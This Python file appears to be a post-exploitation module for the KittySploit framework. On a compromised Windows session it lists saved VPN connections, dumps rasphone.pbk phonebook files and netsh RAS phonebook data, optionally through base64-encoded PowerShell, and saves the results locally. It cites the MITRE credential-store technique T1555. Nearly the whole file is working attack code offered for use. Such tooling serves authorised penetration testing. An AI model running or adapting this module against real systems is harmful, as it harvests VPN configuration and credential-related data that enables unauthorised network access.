#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Extract saved VPN connection details from a Windows session.
"""

from kittysploit import *
from lib.post.windows.session import win_compat_failure_type, win_probe_powershell
import base64
import os
import re
import time

_LOCAL_OUT = "output"


class Module(Post):
    __info__ = {
        "name": "Windows Gather VPN Profiles",
        "description": (
            "List VPN connections via Get-VpnConnection and dump rasphone.pbk "
            "phonebook files on a Windows shell or Meterpreter session."
        ),
        "author": "KittySploit Team",
        "platform": Platform.WINDOWS,
        "session_type": [SessionType.METERPRETER, SessionType.SHELL],
        "references": [
            "https://attack.mitre.org/techniques/T1555/"],
    'agent': {
        'risk': 'intrusive',
        'effects': ['active_exploitation'],
        'expected_requests': 2,
        'reversible': False,
        'approval_required': True,
        'produces': ['risk_signals'],
        'cost': 1.5,
        'noise': 0.5,
        'value': 1.0,
        'requires':         {'min_endpoints': 0,
         'min_params': 0,
         'tech_hints_any': [],
         'tech_hints_all': [],
         'specializations_any': [],
         'risk_signals_any': [],
         'auth_session': False,
         'capabilities_any': [],
         'capabilities_all': [],
         'confidence_min': {},
         'confidence_min_any': {},
         'endpoint_pattern_any': [],
         'param_any': [],
         'api_surface_ready': False},
        'chain':         {'produces_capabilities': [],
         'consumes_capabilities': [],
         'option_bindings': {},
         'suggested_followups': []},
    },
    }

    save_local = OptBool(True, "Save results under ./output", False)
    prefer_powershell = OptBool(
        False,
        "Prefer PowerShell when available (default: type/netsh via cmd)",
        False,
        True,
    )

    def _execute_cmd(self, command: str) -> str:
        if not command:
            return ""
        output = self.cmd_execute(command)
        return output.strip() if output else ""

    def _encode_powershell(self, script: str) -> str:
        return base64.b64encode(script.encode("utf-16le")).decode("ascii")

    def _run_powershell(self, script: str) -> str:
        encoded = self._encode_powershell(script)
        return self._execute_cmd(f"powershell -NoP -NonI -EncodedCommand {encoded}")

    def _bool_opt(self, val, default=False) -> bool:
        if val is None:
            return default
        if isinstance(val, bool):
            return val
        return str(val).strip().lower() in ("1", "true", "yes", "on")

    def _powershell_script(self) -> str:
        return r"""
$sections = New-Object System.Collections.Generic.List[string]
$found = $false

if (Get-Command Get-VpnConnection -ErrorAction SilentlyContinue) {
  $userVpns = @(Get-VpnConnection -ErrorAction SilentlyContinue)
  $allVpns = @(Get-VpnConnection -AllUserConnection -ErrorAction SilentlyContinue)
  $vpns = @($userVpns + $allVpns | Sort-Object -Property Name -Unique)
  if ($vpns.Count -gt 0) {
    $found = $true
    $sections.Add("=== Get-VpnConnection ===`n$($vpns | Format-List | Out-String)")
  }
}

$pbkPaths = @(
  (Join-Path $env:APPDATA 'Microsoft\Network\Connections\Pbk\rasphone.pbk'),
  (Join-Path $env:ProgramData 'Microsoft\Network\Connections\Pbk\rasphone.pbk')
) | Select-Object -Unique

foreach ($pbk in $pbkPaths) {
  if (-not (Test-Path -LiteralPath $pbk)) { continue }
  $found = $true
  $content = Get-Content -LiteralPath $pbk -ErrorAction SilentlyContinue
  $sections.Add("=== Phonebook: $pbk ===`n$($content -join "`n")")
}

$ras = netsh ras show phonebook info 2>&1
if ($LASTEXITCODE -eq 0 -and $ras) {
  $found = $true
  $sections.Add("=== netsh ras show phonebook info ===`n$($ras -join "`n")")
}

if (-not $found) {
  Write-Output 'No VPN profiles or phonebook files found.'
} else {
  $sections -join "`n`n"
}
"""

    def check(self):
        return True

    def _extract_via_cmd(self) -> str:
        sections = []
        found = False
        pbk_paths = (
            r"%APPDATA%\Microsoft\Network\Connections\Pbk\rasphone.pbk",
            r"%ProgramData%\Microsoft\Network\Connections\Pbk\rasphone.pbk",
        )
        for path in pbk_paths:
            exists = self._execute_cmd(f'if exist "{path}" (echo EXISTS) else (echo MISSING)')
            if exists and "EXISTS" in exists:
                found = True
                content = self._execute_cmd(f'type "{path}"')
                sections.append(f"=== Phonebook: {path} ===\n{content or '(empty)'}")

        ras = self._execute_cmd("netsh ras show phonebook info")
        if ras and not re.search(r"not recognized|The following command was not found", ras, re.I):
            found = True
            sections.append(f"=== netsh ras show phonebook info ===\n{ras}")

        if not found:
            return "No VPN profiles or phonebook files found."
        return "\n\n".join(sections)

    def _save_output(self, content: str) -> str:
        os.makedirs(_LOCAL_OUT, exist_ok=True)
        stamp = time.strftime("%Y%m%d_%H%M%S")
        local_path = os.path.join(_LOCAL_OUT, f"vpn_profiles_{stamp}.txt")
        with open(local_path, "w", encoding="utf-8", errors="replace") as f:
            f.write(content)
        return local_path

    def run(self):
        if not self.check():
            raise ProcedureError(win_compat_failure_type(), "VPN dump prerequisites not met")

        print_status("Collecting VPN profiles...")
        use_ps = self._bool_opt(self.prefer_powershell, False) and win_probe_powershell(self._execute_cmd)
        if use_ps:
            print_info("Using PowerShell")
            result = self._run_powershell(self._powershell_script())
        else:
            if self._bool_opt(self.prefer_powershell, False):
                print_warning("PowerShell preferred but not available — falling back to type/netsh")
            result = self._extract_via_cmd()

        if not result:
            raise ProcedureError(FailureType.Unknown, "No output was returned")

        if re.search(r"No VPN profiles or phonebook files found", result, re.I):
            print_warning(result)
            return True

        if self._bool_opt(self.save_local, True):
            local_path = self._save_output(result + "\n")
            print_success(f"Results saved to ./{local_path}")

        print_success("VPN profile extraction completed")
        print_info(result)
        return True
